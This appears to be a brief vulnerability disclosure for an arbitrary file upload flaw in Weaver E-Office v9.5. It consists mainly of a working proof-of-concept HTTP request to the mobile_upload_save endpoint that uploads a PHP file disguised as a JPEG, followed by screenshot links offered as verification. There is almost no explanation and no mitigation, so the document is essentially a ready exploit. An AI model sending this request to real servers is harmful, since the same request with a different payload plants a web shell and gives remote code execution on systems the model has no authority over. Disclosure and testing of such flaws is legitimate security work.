Weaver E-Office v9.5 has arbitrary file upload vulnerability

official website:https://www.e-office.cn/

POC
```
POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1
Host: xx:8088
Content-Length: 338
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="upload_quwan"; filename="1.php@"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
```
verification

![WPS图片(1)](https://user-images.githubusercontent.com/131632691/234152011-123b5f73-6efc-47f1-b753-3e06a4ae6c11.png)

![WPS图片(2)](https://user-images.githubusercontent.com/131632691/234152039-b6b3a7b2-7c09-4e1f-ba30-5285e2b1783a.png)

